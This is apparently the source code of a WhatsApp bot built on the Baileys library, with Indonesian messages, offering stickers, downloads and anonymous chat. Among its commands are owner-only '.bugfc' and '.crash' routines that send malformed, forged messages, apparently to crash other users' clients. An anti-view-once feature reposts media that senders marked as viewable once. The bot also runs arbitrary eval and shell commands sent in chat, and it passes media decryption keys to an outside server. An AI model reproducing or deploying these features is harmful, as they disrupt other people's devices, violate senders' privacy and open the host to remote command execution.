import baileys from "@adiwajshing/baileys"
import axios from "axios"
import fetch from "node-fetch"
import fs from "fs"
import util from "util"
import cp from "child_process"
import module from "module"
import os from "os"
import moment from "moment-timezone"
import cheerio from "cheerio"
import formData from "form-data"
import * as fileType from "file-type"
import emojiRegex from "emoji-regex"
import P from "pino"
import Message, {
    color,
    audio,
    owner,
    anon,
    map,
    set,
    chatsFilter,
    random,
    getRandom,
    streamToBuff,
    ffmpegDefault,
    hapus,
    simpan,
    sticker,
    getExif,
    CustomError,
    clearCache,
    cekUsia
} from "./functions.js"
import data, {
    dl,
    savefrom,
    aiovideodl,
    idML,
    idFF,
    idCOC,
    JSObfuscator,
    topup,
    identifymusic,
    top4top,
    deepai,
    gdrive,
    anonfiles,
    jarak,
    mix,
    gtts,
    formatSize,
    igstalk,
    ytdl
} from "./data.js"
import scrap from "./data.js"
let {
    version,
    isLatest
} = await baileys.fetchLatestBaileysVersion()

global.require = module.createRequire(import.meta.url)
global.setting = {
  author: "xyvnz | Ivanzz`",
  wm: "Stiker By",
    owner: owner,
    prefix: ".",
    antiSpam: false,
    antiNsfw: false,
    antiNsfwRmv: false,
    antiViewonce: true,
    autoReact: false,
    emjReact : ["💗"],
    auth: "auth.json"
}
let app  = require ("express")()
const main = async (auth, memStr, multi) => {
let store = memStr ? baileys.makeInMemoryStore({
    stream: "store"
}) : undefined
store.readFromFile("store.json")
var fileAuth = baileys.useSingleFileAuthState(auth)
var sock = baileys.default({
    auth: fileAuth.state,
    printQRInTerminal: true,
    version: version,
    logger: P({
        level: "silent"
    }),
})
store?.bind(sock.ev)
 setInterval(() => {
store?.writeToFile("store.json")
}, 10_000)
sock.ev.on("creds.update", fileAuth.saveState)
sock.ev.on("connection.update", update => {
    if (multi) {
        sock.ev.emit("multi.sessions", update)
    }
    if (update.connection == "close") {
        var code = update.lastDisconnect?.error?.output?.statusCode;
        console.log(update.lastDisconnect?.error)
        if (code != 401) {
            main(setting.auth, true, true)
        }
        if (update.connection == "open") {
            console.log("Connect to WA Web")
        }
    }
})
sock.ev.on("messages.upsert",
    async (message) => {
        try {
            if (!message.messages[0]) return;
            let timestamp = new Date()
            let msg = message.messages[0]
            if (!msg.message) return;
            let m = new Message(msg, sock, store)
            let type = Object.keys(msg.message)[0]
            let from = msg.key.remoteJid;
            let isGroup = from.endsWith("@g.us")
            let sender = isGroup ? msg.key.participant : m.sender;
            let metadata = isGroup ? await sock.groupMetadata(from) : ""
            let me = sock.user.id.split(":")[0] + baileys.S_WHATSAPP_NET
            let isMeAdmin = isGroup ? metadata.participants.find(v => v.id == me).admin : ""
            let isAdmin = isGroup ? metadata.participants.find(u => u.id == sender)?.admin : ""
            isMeAdmin = isMeAdmin == "admin" || isMeAdmin == "superadmin"
            isAdmin = isAdmin == "admin" || isAdmin == "superadmin"
            let pushname = msg.pushName
            let body = msg.message?.conversation || msg.message?.imageMessage?.caption || msg.message?.videoMessage?.caption || msg.message?.extendedTextMessage?.text || msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId || msg.message?.buttonsResponseMessage?.selectedButtonId || msg.message?.templateButtonReplyMessage?.selectedId || "";
            let args = body.trim().split(/ +/).slice(1)
            let q = args.join(" ")
            let command = body.slice(0).trim().split(/ +/).shift().toLowerCase()
            let isOwner = !!setting.owner.find(o => o == sender)
            let time = moment.tz("Asia/Jakarta").format("HH:mm:ss")
            let prefix = setting.prefix
            let isCmd = command.startsWith(prefix)
            function reply(text) {
                sock.sendMessage(from, {
                    text
                }, {
                    quoted: msg
                })
            }
            async function sendContact(jid, numbers, name, quoted, men) {
                let number = numbers.replace(/[^0-9]/g, '')
                const vcard = 'BEGIN:VCARD\n' +
                    'VERSION:3.0\n' +
                    'FN:' + name + '\n' +
                    'ORG:;\n' +
                    'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n' +
                    'END:VCARD'
                return sock.sendMessage(jid, {
                    contacts: {
                        displayName: name,
                        contacts: [{
                            vcard
                        }]
                    },
                    mentions: men ? men : []
                }, {
                    quoted: quoted
                })
            }
            
            if (setting.autoReact) {
     sock.sendMessage(from, { react: { key: m.key, text: random(setting.emjReact)}})
                }
            if (command) {
                console.log(`[ MESSAGE ] from ${pushname} text: ${body}`)
            }
            switch (command) {
                case prefix + "anonymous":
                    var teks = "*MENU ANONYMOUS CHAT*\n\n"
                    teks += prefix + "start [untuk memulai chat]\n"
                    teks += prefix + "next [untuk memulai chat baru]\n"
                    teks += prefix + "leave [untuk keluar dari chat]\n"
                    teks += prefix + "sendprofile [untuk mengirim kontak mu]\n"
                    reply(teks)
                    break
                case prefix + "getpp":
                    if (isGroup && !q) return reply("Masukan nomor atau tag member!")
                    if (!q) return reply("Masukan nomor!")
                    let no;
                    let image;
                    if (q.includes(baileys.S_WHATSAPP_NET)) no = q.split("@")[0]
                    else if (q.startsWith("@")) no = q.split("@")[1]
                    else no = q;
                    var data = await sock.onWhatsApp(no + baileys.S_WHATSAPP_NET)
                    if (data.length > 0) {
                        sock.profilePictureUrl(data[0].jid, "image").then(async (pp) => {
                            sock.sendMessage(from, {
                                image: {
                                    url: pp
                                }
                            }, {
                                quoted: msg
                            })
                        }).catch(_ => {
                            reply("No Profile")
                        })
                    }
                    break;
                case prefix + "upload":
                    try {
                        let top = await top4top(await m.quoted.download())
                        reply(util.format(top))
                    } catch (e) {
                        reply(e)
                    }
                    break;
                case prefix + "deepai":
                    let dep = await deepai(q, {
                        image: m.quoted ? await m.quoted.download() : await m.download()
                    })
                    sock.sendMessage(from, {
                        image: {
                            url: dep.output_url
                        }
                    }, {
                        quoted: msg
                    })
                    break
                case prefix + "gdrive":
                    let gdr = await gdrive(q)
                    sock.sendMessage(from, {
                        document: {
                            url: gdr.downloadUrl
                        },
                        fileName: gdr.fileName,
                        mimetype: gdr.mimetype
                    }, {
                        quoted: msg
                    })
                    break

                case prefix + "join":
                    var link = q
                    if (!q) link = m.quoted ? m.quoted.text : m.text
                    if (!/https?:\/\/(chat\.whatsapp\.com)\/[A-Za-z]/.test(link)) return ("Link tidak valid")
                    try {
                        var code = link.split("/")[3]
                        await sock.groupAcceptInvite(code)
                        reply("Suscess join")
                    } catch (e) {
                        reply(String(e))
                    }
                    break;
                    case "jarak":
                    var dari = q.split("|")[0]
                    var ke = q.split("|")[1]
                    var jr = await jarak(dari, ke)
                    sock.sendMessage(from, { image: { url: jr.img }, caption: jr.desc }, { quoted: msg })
                    break
                case "read":
                    if (!msg.message[type]?.contextInfo?.quotedMessage) return;
                    var tipeQuot = Object.keys(msg.message[type].contextInfo.quotedMessage)[0]
                    if (tipeQuot == "viewOnceMessage") {
                        var anu = msg.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessage.message
                        var tipe = Object.keys(anu)[0]
                        delete anu[tipe].viewOnce
                        var ah = {}
                        if (anu[tipe].caption) ah.caption = anu[tipe].caption
                        if (anu[tipe]?.contextInfo?.mentionedJid) {
                            ah.contextInfo = {}
                            ah.contextInfo.mentionedJid = anu[tipe]?.contextInfo?.mentionedJid || []
                        }
                        var dta = await baileys.downloadContentFromMessage(anu[tipe], tipe.split("M")[0])
                        sock.sendMessage(from, {
                            [tipe.split("M")[0]]: await streamToBuff(dta),
                            ...ah
                        }, {
                            quoted: msg
                        })
                    }
                    if (tipeQuot == "documentMessage") {
                        var text = (await m.quoted.download()).toString()
                        if (text.length >= 65000) text.slice(65000)
                        reply(util.format(text))
                    }
                    break;
                    case prefix + "audio": {
                      if (!q) return reply("masuk kan prameter")
    let data = await m.quoted.download()
    let dataa = q.split("|")[0]
    let dataaa = q.split("|")[1]
    await sock.sendMessage(from, {
        audio: await audio.create(data, {
            [dataa]: dataaa
        }),
        mimetype: "audio/mpeg",
        ptt: true 
    }, {
        quoted: msg
    })
}
break
case prefix+"cekusia":
  case prefix+ "umur":
  if (!q) return reply ("penggunaan .cekUsia 2007 11 1")
  reply(cekUsia(q))
  break
case prefix+ "crash":
let reactionMessage = baileys.proto.ReactionMessage.create({ key: m.key, text: "🗿" })
sock.relayMessage(from, { reactionMessage }, { messageId: "ppppp" })
break
                case prefix + "tt":
                case prefix + "tiktok":
                case prefix + "ttmp4":
                    if (!q) return reply("masukan url")
                    try {
                        var data = await savefrom(q)
                        sock.sendMessage(from, {
                            video: {
                                url: data.url[0].url
                            }
                        }, {
                            quoted: msg
                        })
                    } catch (e) {
                        reply(String(e))
                    }
                    break;

                case prefix + "bugfc":
                    if (!isOwner) return
                    let bugfc = {
                        key: {
                            fromMe: true,
                            participant: `0@s.whatsapp.net`,
                            ...({
                                remoteJid: ""
                            })
                        },
                        message: {
                            conversation: 'p'
                        }
                    }
                    sock.sendMessage(q ? q:from, {
                        text: 'p'
                    }, {
                        quoted: bugfc
                    })
                    break
                case prefix + "ttmp3":
                case prefix + "tiktokaudio":
                case prefix + "tiktokmusic":
                case prefix + "tiktokmp3":
                    if (!q) return reply("masukan url")
                    try {
                        var dataaa = await savefrom(q)
                        var filename = getRandom("mp4")
                        var out = getRandom("mp3")
                        var buff = await (await fetch(dataaa.url[0].url)).buffer()
                        await fs.writeFileSync(filename, buff)
                        var outname = await ffmpegDefault(filename, out)
                        sock.sendMessage(from, {
                            audio: fs.readFileSync(outname),
                            mimetype: "audio/mpeg"
                        }, {
                            quoted: msg
                        })
                        hapus(outname)
                        hapus(filename)
                    } catch (e) {
                        reply(String(e))
                    }
                    break;
                    case prefix+ "stiker":
                      case prefix+"s":
                       if (q) {
                         sock.sendMessage(from, { sticker: await sticker(m.quoted ? await m.quoted.download() : await m.download(), { pack: q.split("|")[0], author: q.split("|")[1]})})
                       } else {
                        sock.sendMessage(from, { sticker: await sticker(m.quoted ? await m.quoted.download() : await m.download(), { pack: setting.wm, author: setting.author})})
                       }
                       break
                case prefix + "emojimix":
                case prefix + "mix":
                    if (!q) return reply("masukan emoji")
                    var [emoji1, emoji2] = q.split("|")
                    var url = await mix(encodeURI(emoji1), encodeURI ( emoji2))
                    if (!url || url?.results?.length == 0) return reply(`Emoji ${emoji1} dan ${emoji2} tidak di temukan`)
                    var buff = await fetch(url.results[0].url)
                    sock.sendMessage(from, {
                        sticker: await sticker (buff.buffer(), { author: setting.author, pack: setting.wm, type: "FULL" })
                    }, {
                        quoted: msg
                    })
                    break;
                case prefix + "react":
                case prefix + "r":

                    if (sock.type == "legacy") return reply("Error does not support legacy")
                    if (!args[0]) return reply("Masukan emoji")
                    let reac = await react({
                        jid: m.from,
                        participant: m.quoted ? m.quoted.sender : m.sender,
                        id: m.quoted ? m.quoted.id : m.id,
                        emoji: args[0],
                        timestamp: m.messageTimestamp
                    })
                    await sock.relayMessage(reac.key.remoteJid, {
                        reactionMessage: reac
                    }, {
                        messageId: baileys.generateMessageID()
                    });

                    break;
                case prefix + "leave":
                case prefix + "next": {
                    if (isGroup && isOwner && command == prefix + "leave") return sock.groupLeave(from)
                    if (isGroup) return reply("Only private chat")
                    var room = Object.values(anon.anonymous).find(p => p.check(sender))
                    if (!room) return reply("Anda tidak berada didalam room")
                    reply("Ok")
                    var other = room.other(sender)
                    delete anon.anonymous[room.id]
                    if (other != "") sock.sendMessage(other, {
                        text: "Partner meninggalkan room chat"
                    })
                    if (command == prefix + "leave") break;
                }
                case prefix + "start":
                    if (isGroup) return reply("Only private chat")
                    if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("Anda masih didalam room")
                    var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
                    if (!check) {
                        anon.createRoom(sender)
                        console.log("[  ANONYMOUS  ] Creating room for: " + sender);
                        return reply("Menunggu partner")
                    }
                    var join = anon.joinRoom(sender)
                    if (join) {
                        reply("Menunggu partner")
                        console.log("[  ANONYMOUS  ] Join a room " + sender);
                        sock.sendMessage(from, {
                            text: "Menemukan partner"
                        })
                        sock.sendMessage(join.other(sender), {
                            text: "Menemukan partner"
                        })
                    }
                    break;
                case prefix + "sendprofile":
                    if (isGroup) return reply("Only private chat")
                    var wait = Object.values(anon.anonymous).find(p => p.state == "WAITING" && p.check(sender))
                    if (wait) return reply("kamu mau kirim profile ke siapa??")
                    var chat = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
                    if (!chat) return reply("Anda tidak berada didalam room")
                    var other = chat.other(sender)
                    var msgs = await sendContact(other, sender.split("@")[0], pushname)
                    reply("Send profile success")
                    sock.sendMessage(other, {
                        text: "Teman chat kamu mengirimkan profilnya!"
                    }, {
                        quoted: msgs
                    })
                    break;
                case ">":
                    if (!isOwner) return;
                    try {
                        var text = util.format(await eval(`(async()=>{ ${args.join(" ")} })()`))
                        sock.sendMessage(from, {
                            text
                        }, {
                            quoted: msg
                        })
                    } catch (e) {
                        sock.sendMessage(from, {
                            text: util.format(e)
                        }, {
                            quoted: msg
                        })
                    }
                    break;
                case prefix + "q":
                    if (!m.quoted) return reply("Reply pesan")
                    var quotedObj = await m.quoted.getQuotedObj()
                    if (!quotedObj.quoted) return reply("Pesan yang anda reply tidal mengandung reply")
                    sock.relayMessage(from, {
                        ...quotedObj.quoted.fakeObj
                    }, {
                        messageId: baileys.generateMessageID()
                    })
                    break;
                case "=>":
                    if (!isOwner) return;
                    try {
                        var text = util.format(await eval(`(async() => { return ${args.join(" ")} })()`))
                        sock.sendMessage(from, {
                            text
                        }, {
                            quoted: msg
                        })
                    } catch (e) {
                        sock.sendMessage(from, {
                            text: util.format(e)
                        }, {
                            quoted: msg
                        })
                    }
                    break;
                case "$":
                    if (!isOwner) return;
                    try {
                        cp.exec(args.join(" "), function(er, st) {
                            if (er) sock.sendMessage(from, {
                                text: util.format(er.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))
                            }, {
                                quoted: msg
                            })
                            if (st) sock.sendMessage(from, {
                                text: util.format(st.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))
                            }, {
                                quoted: msg
                            })
                        })
                    } catch (e) {
                        console.warn(e)
                    }
                    break;
                default:
                    if (!isGroup && !isCmd && !m.key.fromMe) {
                        let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
                        //console.log(room);
                        if (room) {
                            let other = room.other(sender)
                            sock.relayMessage(other, baileys.generateForwardMessageContent(m.fakeObj, 1), {
                                messageId: baileys.generateMessageID()
                            })
                        }
                    }
                    if (setting.antiSpam && isGroup && !m.key.fromMe) {
                        chatsFilter.add(body)
                        let h = chatsFilter.has(body)
                        console.log(h);
                        if (h) {
                            reply("Jangan spam!")
                        }
                    }
                    if (setting.antiNsfw && !msg.key.fromMe && m.type == "imageMessage") {
                        let data = await m.download()
                        let res = await deepai("nsfw-detector", {
                            image: data
                        })
                        if (res.output.nsfw_score > 0.75) {
                            reply(`*NSFW DETECTED*\n\nNAMA: ${pushname}\nWAKTU: ${time}`)
                            console.log("[ NSFW DETECTED ]\n\n" + res.output)
                            if (setting.antiNsfwRmv && setting.antiNsfwRmv != undefined) return sock.groupParticipantsUpdate(from, [sender], "remove")
                        }
                    }

                    if (setting.antiViewonce && type == "viewOnceMessage" && !msg.key.fromMe) {
                        var anu = msg.message.viewOnceMessage.message
                        var tipe = Object.keys(anu)[0]
                        delete anu[tipe].viewOnce
                        var ah = {}
                        if (anu[tipe].caption) ah.caption = anu[tipe].caption
                        if (anu[tipe]?.contextInfo?.mentionedJid) {
                            ah.contextInfo = {}
                            ah.contextInfo.mentionedJid = anu[tipe]?.contextInfo?.mentionedJid || []
                        }
                        let uh = await sock.sendMessage(from, { text:`ANTI VIEWONCE MESSAGE\n\nNama: ${pushname}\nWaktu: ${moment.tz("Asia/Jakarta").format("HH:mm:ss")}\nTipe: ${tipe}`}, { quoted: msg})

                        var data = await baileys.downloadContentFromMessage(anu[tipe], tipe.split("M")[0])

                        sock.sendMessage(from, {

                            [tipe.split("M")[0]]: await streamToBuff(data),

                            ...ah

                        }, {quoted: uh})
                    }
            }
        } catch (e) {
            console.error(e)
            return;
        }
    })
}

main(setting.auth, true, true)
startApp()

process.on("UnhandledPromiseRejection", async qm => {
    console.log("[  INFO  ] " + qm)
    main(setting.auth, true, true)
})

async function react(options = {}, sock) {
    if (!options.jid) throw new Error("Jid not be empty")
    if (!options.id) throw new Error("id not be empty")
    if (!options.participant) throw new Error("participat not be empty")
    if (!options.timestamp) throw new Error("timestamp not be empty")
    if (!options.emoji) throw new Error("emoji not be empty")
    let reac = await baileys.proto.ReactionMessage.create({
        key: {
            id: options.id,
            participant: options.participant,
            remoteJid: options.jid,
        },
        text: options.emoji,
        senderTimestampMs: options.timestamp
    });
    if (sock) return await sock.relayMessage(reac.key.remoteJid, {
        reactionMessage: reac
    }, {
        messageId: baileys.generateMessageID()
    });
    else return reac
}
async function mmgwa(msg) {
    try {
        if (msg.url && msg.mediaKey) {
            const mediakei = Buffer.from(msg.mediaKey).toString('base64')
            return `https://xyvnz.herokuapp.com/api/mmg/${msg.url.split('/d/f/')[1]}/${encodeURIComponent(mediakei)}?type=${msg.mimetype.split('/')[0]}`
        }
        const psn = msg.message[type]
        const urlmsg = psn?.url
        if (!urlmsg) return
        const mediakei = Buffer.from(psn.mediaKey).toString('base64')
        return `https://xyvnz.herokuapp.com/api/mmg/${urlmsg.split('/d/f/')[1]}/${encodeURIComponent(mediakei)}?type=${psn.mimetype.split('/')[0]}`
    } catch (e) {
        return e
    }
}

// api
function startApp() {
  app.get("/bot", function(req, res) {
    res.send("Active!!")
  })
  app.get("/docs", function(req, res) {
    res.sendFile(process.cwd() + "/docs.html")
  })
  app.get("/", function(req, res) {
    res.sendFile(process.cwd() + "/home.html")
  })
  
  app.get('/api/mmg/:urlpath/:mediaKey', async(req, res) => {
  try {
  const downloadM = baileys.downloadContentFromMessage
	const urlmmg = 'https://mmg.whatsapp.net/d/f/'
	const downloadm = req.query
	const {urlpath} = req.params
	if (!downloadm.type) return res.status(404).send('?type not found')
	const mediaKey = Buffer.from(req.params.mediaKey, 'base64')
	if (downloadm.directPath) var directPath = Buffer.from(downloadm.directPath, 'base64')
	var stream = await downloadM({url: urlmmg+urlpath, mediaKey, directPath}, downloadm.type)
		let buffer = Buffer.from([])
  	  for await(const chunk of stream) {
  	  	buffer = Buffer.concat([buffer, chunk])
  	  }
	let type = await fileType.fileTypeFromBuffer(buffer) || {
      mime: 'application/octet-stream',
      ext: '.bin'
	}
	res.set("content-type", type.mime).send(buffer)
  } catch (e) {
	res.status(404).send(e+``)
  }
})
  app.listen(process.env.PORT, () => console.log("Connected"))
}
// Ivanzz - © 2022
